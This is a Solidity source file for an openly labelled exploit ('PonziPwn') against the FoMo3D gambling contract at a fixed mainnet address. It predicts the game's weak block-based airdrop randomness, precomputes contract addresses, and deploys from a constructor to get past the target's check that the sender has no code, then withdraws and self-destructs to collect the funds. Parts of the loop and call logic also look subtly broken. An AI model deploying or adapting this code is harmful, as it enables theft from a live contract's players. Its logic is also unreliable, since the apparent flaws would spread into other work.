1 pragma solidity ^0.4.24;
2 
3 interface FoMo3DlongInterface {
4     function airDropTracker_() external returns (uint256);
5     function airDropPot_() external returns (uint256);
6     function withdraw() external;
7 }
8 
9 /* 
10  * Contract addresses are deterministic. 
11  * We find out how many deployments it'll take to get a winning contract address
12  * then deploy blank contracts until we get to the second last number of deployments to generate a successful address.
13 */
14 contract BlankContract {
15     constructor() public {}
16 }
17 
18 //contract which will win the airdrop
19 contract AirDropWinner {
20     //point to Fomo3d Contract
21     FoMo3DlongInterface private fomo3d = FoMo3DlongInterface(0xA62142888ABa8370742bE823c1782D17A0389Da1);
22     /*
23      * 0.1 ether corresponds the amount to send to Fomo3D for a chance at winning the airDrop
24      * This is sent within the constructor to bypass a modifier that checks for blank code from the message sender
25      * As during construction a contract's code is blank.
26      * We then withdraw all earnings from fomo3d and selfdestruct to returns all funds to the main exploit contract.
27      */
28     constructor() public {
29         if(!address(fomo3d).call.value(0.1 ether)()) {
30            fomo3d.withdraw();
31            selfdestruct(msg.sender);
32         }
33 
34     }
35 }
36 
37 contract PonziPwn {
38     FoMo3DlongInterface private fomo3d = FoMo3DlongInterface(0xA62142888ABa8370742bE823c1782D17A0389Da1);
39     
40     address private admin;
41     uint256 private blankContractGasLimit = 20000;
42     uint256 private pwnContractGasLimit = 250000;
43        
44     //gasPrice you'll use during the exploit
45     uint256 private gasPrice = 10;
46     uint256 private gasPriceInWei = gasPrice*1e9;
47     
48     //cost of deploying each contract
49     uint256 private blankContractCost = blankContractGasLimit*gasPrice ;
50     uint256 private pwnContractCost = pwnContractGasLimit*gasPrice;
51     uint256 private maxAmount = 10 ether;
52     
53     modifier onlyAdmin() {
54         require(msg.sender == admin);
55         _;
56     }
57 
58     constructor() public {
59         admin = msg.sender;
60     }
61 
62     function checkPwnData() private returns(uint256,uint256,address) {
63         //The address that a contract deployed by this contract will have
64         address _newSender = address(keccak256(abi.encodePacked(0xd6, 0x94, address(this), 0x01)));
65         uint256 _nContracts = 0;
66         uint256 _pwnCost = 0;
67         uint256 _seed = 0;
68         uint256 _tracker = fomo3d.airDropTracker_();
69         bool _canWin = false;
70         while(!_canWin) {
71             /* 
72 	     * How the seed if calculated in fomo3d.
73              * We input a new address each time until we get to a winning seed.
74             */
75             _seed = uint256(keccak256(abi.encodePacked(
76                    (block.timestamp) +
77                    (block.difficulty) +
78                    ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)) +
79                    (block.gaslimit) +
80                    ((uint256(keccak256(abi.encodePacked(_newSender)))) / (now)) +
81                    (block.number)
82             )));
83 
84             //Tally number of contract deployments that'll result in a win. 
85             //We tally the cost of deploying blank contracts.
86             if((_seed - ((_seed / 1000) * 1000)) >= _tracker) {
87                     _newSender = address(keccak256(abi.encodePacked(0xd6, 0x94, _newSender, 0x01)));
88                     _nContracts++;
89                     _pwnCost+= blankContractCost;
90             } else {
91                     _canWin = true;
92                     //Add the cost of deploying a contract that will result in the winning of an airdrop
93                     _pwnCost += pwnContractCost;
94             }
95         }
96         return (_pwnCost,_nContracts,_newSender);
97     }
98 
99     function deployContracts(uint256 _nContracts,address _newSender) private {
100         /* 
101 	 * deploy blank contracts until the final index at which point we first send ETH to the pregenerated address then deploy
102          * an airdrop winning contract which will have that address;
103         */
104         for(uint256 _i; _i < _nContracts; _i++) {
105             if(_i++ == _nContracts) {
106                address(_newSender).call.value(0.1 ether)();
107                new AirDropWinner();
108             }
109             new BlankContract();
110         }
111     }
112 
113     //main method
114     function beginPwn() public onlyAdmin() {
115         uint256 _pwnCost;
116         uint256 _nContracts;
117         address _newSender;
118         (_pwnCost, _nContracts,_newSender) = checkPwnData();
119         
120 	//check that the cost of executing the attack will make it worth it
121         if(_pwnCost + 0.1 ether < maxAmount) {
122            deployContracts(_nContracts,_newSender);
123         }
124     }
125 
126     //allows withdrawal of funds after selfdestructing of a child contract which return funds to this contract
127     function withdraw() public onlyAdmin() {
128         admin.transfer(address(this).balance);
129     }
130 }